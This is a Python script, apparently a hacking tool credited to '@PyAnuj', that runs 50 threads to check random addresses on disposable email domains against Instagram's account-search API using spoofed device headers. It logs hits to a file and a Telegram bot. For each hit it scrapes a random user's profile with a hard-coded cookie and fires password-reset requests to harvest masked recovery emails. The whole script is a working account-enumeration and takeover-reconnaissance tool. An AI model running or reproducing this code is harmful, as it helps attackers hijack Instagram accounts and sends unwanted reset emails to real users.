import requests
from datetime import datetime
import time
import sys
import os
import random
import secrets
import uuid
import json
import base64
import re
import httpx
from threading import Thread, Lock
from cfonts import render

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')


class InstagramChecker:
    def __init__(self):
        self.session = requests.Session()
        self.csrf = None
        self.lsd = None
        self.doc_id = "26672929172408668"
        self.lock = Lock()

    def _ensure_tokens(self):
        with self.lock:
            if self.csrf and self.lsd:
                return True
        try:
            headers = {
                'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
                'x-ig-app-id': "936619743392459",
                'x-bloks-version-id': "f0fd53409d7667526e529854656fe20159af8b76db89f40c333e593b51a2ce10",
                'origin': "https://www.instagram.com",
                'referer': "https://www.instagram.com/",
            }
            response = self.session.get('https://www.instagram.com/', headers=headers, timeout=20)
            if response.status_code == 200:
                csrf = response.cookies.get('csrftoken', '')
                match = re.search(r'"LSD",\[\],\{"token":"([^"]+)"\}', response.text)
                lsd = match.group(1) if match else None
                if csrf and lsd:
                    with self.lock:
                        self.csrf = csrf
                        self.lsd = lsd
                    return True
        except:
            pass
        return False

    def check_email(self, email):
        url = "https://i.instagram.com/api/v1/bloks/async_action/com.bloks.www.caa.ar.search.async/"
        device = "android-" + ''.join(random.choices('abcdef0123456789', k=16))
        family = str(uuid.uuid4())
        android = "android-" + ''.join(random.choices('abcdef0123456789', k=16))
        waterfall = str(uuid.uuid4())

        payload = {
            'params': "{\"client_input_params\":{\"aac\":\"{\\\"aac_init_timestamp\\\":" + str(int(time.time())) + ",\\\"aacjid\\\":\\\"" + str(uuid.uuid4()) + "\\\",\\\"aaccs\\\":\\\"" + secrets.token_urlsafe(32) + "\\\"}\",\"flash_call_permissions_status\":{\"READ_PHONE_STATE\":\"PERMANENTLY_DENIED\",\"READ_CALL_LOG\":\"DENIED\",\"ANSWER_PHONE_CALLS\":\"DENIED\"},\"was_headers_prefill_available\":0,\"network_bssid\":null,\"sfdid\":\"\",\"fetched_email_token_list\":{},\"search_query\":\"" + email + "\",\"auth_secure_device_id\":\"\",\"ig_oauth_token\":[],\"cloud_trust_token\":null,\"was_headers_prefill_used\":0,\"sso_accounts_auth_data\":[],\"encrypted_msisdn\":\"\",\"device_network_info\":null,\"text_input_id\":\"akyuf0:61\",\"zero_balance_state\":null,\"android_build_type\":\"release\",\"accounts_list\":[],\"is_oauth_without_permission\":0,\"ig_android_qe_device_id\":\"" + device + "\",\"gms_incoming_call_retriever_eligibility\":\"client_not_supported\",\"search_screen_type\":\"email_or_username\",\"is_whatsapp_installed\":1,\"lois_settings\":{\"lois_token\":\"\"},\"ig_vetted_device_nonce\":null,\"headers_infra_flow_id\":\"\",\"fetched_email_list\":[]},\"server_params\":{\"event_request_id\":\"" + str(uuid.uuid4()) + "\",\"is_from_logged_out\":0,\"layered_homepage_experiment_group\":null,\"device_id\":\"" + android + "\",\"login_surface\":\"login_home\",\"waterfall_id\":\"" + waterfall + "\",\"INTERNAL__latency_qpl_instance_id\":6.3987980400102E13,\"is_platform_login\":0,\"context_data\":\"\",\"login_entry_point\":\"logged_out\",\"INTERNAL__latency_qpl_marker_id\":36707139,\"family_device_id\":\"" + family + "\",\"offline_experiment_group\":\"caa_iteration_v3_perf_ig_4\",\"access_flow_version\":\"pre_mt_behavior\",\"is_from_logged_in_switcher\":0,\"qe_device_id\":\"" + device + "\"}}",
            'bk_client_context': "{\"bloks_version\":\"5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b\",\"styles_id\":\"instagram\"}",
            'bloks_versioning_id': "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b"
        }
        headers = {
            'User-Agent': "Instagram 320.0.0.34.109 Android (33/13; 420dpi; 1080x2340; samsung; SM-A546B; a54x; exynos1380; en_US; 465123678)",
            'accept-language': "en-IN, en-US",
            'x-bloks-version-id': "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b",
            'x-fb-friendly-name': "IgApi: bloks/async_action/com.bloks.www.caa.ar.search.async/",
            'x-ig-android-id': android,
            'x-ig-app-id': "567067343352427",
            'x-ig-app-locale': "en_IN",
            'x-ig-client-endpoint': "com.bloks.www.caa.ar.search",
            'x-ig-device-id': device,
            'x-ig-family-device-id': family,
            'x-ig-timezone-offset': str(int(datetime.now().astimezone().utcoffset().total_seconds())),
            'x-mid': base64.urlsafe_b64encode(secrets.token_bytes(18)).decode().rstrip('='),
            'x-pigeon-rawclienttime': str(time.time()),
            'x-pigeon-session-id': f"UFS-{uuid.uuid4()}-0",
            'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
        }
        try:
            resp = requests.post(url, data=payload, headers=headers, timeout=20)
            if f"{email}" in resp.text:
                return True
            else:
                return False
        except:
            return False

    def get_user_data(self, user_id):
        if not self._ensure_tokens():
            return None
        url = "https://www.instagram.com/api/graphql"
        headers = {
            'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
            'Content-Type': 'application/x-www-form-urlencoded',
            'x-bloks-version-id': "f0fd53409d7667526e529854656fe20159af8b76db89f40c333e593b51a2ce10",
            'x-ig-app-id': '936619743392459',
            'x-fb-lsd': self.lsd,
            'x-csrftoken': self.csrf,
            'x-fb-friendly-name': 'PolarisProfilePageContentQuery',
            'sec-ch-ua-platform': '"Android"',
            'origin': 'https://www.instagram.com',
            'sec-fetch-site': 'same-origin'
        }
        cookies = {'rur': '"HIL\\0545636887483\\0541808136332:01fe43b89fcef61b8a466bfa81acf2b1bbab08f406fc99b1da8b7d889fa68683a3364c43"'}
        variables = {
            "enable_integrity_filters": True,
            "id": str(user_id),
            "__relay_internal__pv__PolarisCannesGuardianExperienceEnabledrelayprovider": True,
            "__relay_internal__pv__PolarisCASB976ProfileEnabledrelayprovider": False,
            "__relay_internal__pv__PolarisWebSchoolsEnabledrelayprovider": False,
            "__relay_internal__pv__PolarisRepostsConsumptionEnabledrelayprovider": False,
        }
        payload = {
            'lsd': self.lsd,
            'fb_api_caller_class': 'RelayModern',
            'fb_api_req_friendly_name': 'PolarisProfilePageContentQuery',
            'variables': json.dumps(variables),
            'server_timestamps': 'true',
            'doc_id': self.doc_id,
        }
        try:
            response = self.session.post(url, headers=headers, data=payload, cookies=cookies, timeout=20)
            if response.status_code == 200:
                data = response.json()
                user = data.get('data', {}).get('user')
                if user and user.get('username'):
                    return user
        except:
            pass
        return None

    def fetch_reset_email(self, username):
        try:
            headers = {
                "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
                "x-ig-app-id": "936619743392459",
                "x-requested-with": "XMLHttpRequest",
                "origin": "https://www.instagram.com",
                "referer": "https://www.instagram.com/accounts/password/reset/",
            }
            client = httpx.Client(http2=True, headers=headers, timeout=10)
            r = client.post(
                "https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/",
                data={"email_or_username": username}
            )
            if r.status_code == 200:
                data = r.json()
                if data.get("status") == "ok":
                    return data.get('obfuscated_email') or data.get('contact_point') or "-"
            return "-"
        except:
            return "-"



print("\033[1;94m--- Starting Script, Please Wait... ---\033[0m\n")
time.sleep(1)
clear()

red = "\033[1m\033[31m"
green = "\033[1m\033[32m"
yellow = "\033[1m\033[33m"
blue = "\033[1m\033[34m"
cyan = "\033[1m\033[36m"
white = "\033[1m\033[37m"
reset = '\033[0m'

logo = render('ANUJ', font='block', colors=['cyan', 'white'], align='left', space=True)
print("\x1b[1;39m—" * 60)
print(logo)
print("\x1b[1;39m—" * 60)
print('')

hit = 0
baddie_ig = 0
ayodhya = 0

print("𝐄𝐍𝐓𝐄𝐑 𝐁𝐎𝐓 𝐓𝐎𝐊𝐀𝐍")
token = input(f"➜ ").strip()
clear()
print("\x1b[1;39m—" * 60)
print(logo)
print("\x1b[1;39m—" * 60)
print('')
print('𝐄𝐍𝐓𝐄𝐑 𝐂𝐇𝐀𝐓 𝐈𝐃')
chat_id = input(f"➜ ").strip()
clear()


ig = InstagramChecker()



def send_telegram(msg):
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    payload = {"chat_id": chat_id, "text": msg, "parse_mode": "HTML"}
    try:
        requests.post(url, json=payload, timeout=15)
    except:
        pass


def status():
    global hit, baddie_ig, ayodhya
    pyanuj = f"""
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱
𝐇𝐈𝐓   ➜ {green}{hit}{reset}
𝐁𝐀𝐃 𝐈𝐍𝐒𝐓𝐀𝐆𝐑𝐀𝐌   ➜ {red}{baddie_ig}{reset}
𝐓𝐎𝐓𝐀𝐋 𝐂𝐇𝐄𝐂𝐊𝐄𝐃   ➜ {yellow}{ayodhya}{reset}
▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰
𝐃𝐄𝐕 — @𝐏𝐲𝐀𝐧𝐮𝐣 {reset}
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▱
"""
    clear()
    print(pyanuj)



def genprefix():
    char = 'abcdefghijklmnopqrstuvwxyz'
    lent = random.randint(6, 7)
    name = ''.join(random.choices(char, k=lent))
    return name


def adh(choose):
    global hit, baddie_ig, ayodhya

    while True:
        prefix = genprefix()

        if choose == '1':
            domain = '@hi2.in'
        elif choose == '2':
            domain = '@telegmail.com'
        else:
            domain = '@hi2.in'

        email = f'{prefix}{domain}'
        ayodhya += 1
        status()

        if ig.check_email(email):
           
            user_data = None
            try:
                for _ in range(5):
                    rand_pk = random.randint(2500000000, 21254029834)
                    u = ig.get_user_data(rand_pk)
                    if u and u.get('username'):
                        user_data = u
                        break
            except Exception:
                user_data = None

            
            if user_data:
                username   = user_data.get('username', '')
                full_name  = user_data.get('full_name', '')
                followers  = user_data.get('follower_count') or 0
                following  = user_data.get('following_count') or 0
                posts      = user_data.get('media_count') or 0
                bio        = (user_data.get('biography', '') or '')[:50]
                pk         = user_data.get('pk', 0)
                is_private = user_data.get('is_private', False)
                reset_mask = ig.fetch_reset_email(username)
            else:
                username   = email.split('@')[0]
                full_name  = "-"
                followers  = 0
                following  = 0
                posts      = 0
                bio        = "-"
                pk         = 0
                is_private = False
                reset_mask = "-"

            domain_str = email.split('@')[1] if '@' in email else 'gmail.com'

            
            try:
                pk_int = int(pk)
                year_ranges = [
                    (1, 5000000, 2010), (5000001, 17750000, 2011),
                    (17750001, 279760000, 2012), (279760001, 900990000, 2013),
                    (900990001, 1629010000, 2014), (1629010001, 2369359761, 2015),
                    (2369359762, 4239516754, 2016), (4239516755, 6345108209, 2017),
                    (6345108210, 10016232395, 2018), (10016232396, 27238602159, 2019),
                    (27238602160, 43464475395, 2020), (43464475395, 50289297647, 2021),
                    (50289297647, 57464707082, 2022), (57464707082, 63313426938, 2023),
                    (63313426938, 70134323896, 2024), (70313426938, 78313496938, 2025)
                ]
                year = "2023+"
                for low, high, y in year_ranges:
                    if low <= pk_int <= high:
                        year = str(y)
                        break
            except:
                year = "Unknown"

           
            moni_status = "[X]"
            if not is_private and posts >= 3 and bio and len(bio) > 10:
                personal_words = ["my", "i", "me", "life", "vlog", "daily", "family", "love", "❤", "✨", "🎥"]
                if any(word in bio.lower() for word in personal_words):
                    moni_status = "[OK]"
                elif posts >= 5:
                    moni_status = "[OK]"

            
            hit += 1
            status()

            
            full_msg = f"""
<b>=== HIT FOUND ===</b>


<b>EMAIL</b>      -> <i>{email}</i>

<b>PORTFOLIO</b>  -> <i>https://instagram.com/{username}</i>

--------------------------------------------------
<b>CREDIT</b>     -> <i>@PyAnuj</i>
<b>CHANNEL</b>    -> <i>@itz_4nuj1</i>
--------------------------------------------------
"""

            
            print(full_msg)
            with open('anujtempmail.txt', 'a') as f:
                f.write(email + '\n')
            send_telegram(full_msg)

        else:
            baddie_ig += 1
            status()
            print(f'{red}✗ Not on Instagram: {email} {reset}')


if __name__ == '__main__':
    print(f"""
————————————————————   
{green}[1]{white} 𝐇𝐈2 
{green}[2]{white} 𝐓𝐄𝐋𝐄𝐆𝐌𝐀𝐈𝐋 
————————————————————
""")

    choose = input(f"{cyan}➤ your choice (1/2): {reset}").strip()

    for i in range(50):
        Thread(target=adh, args=(choose,)).start()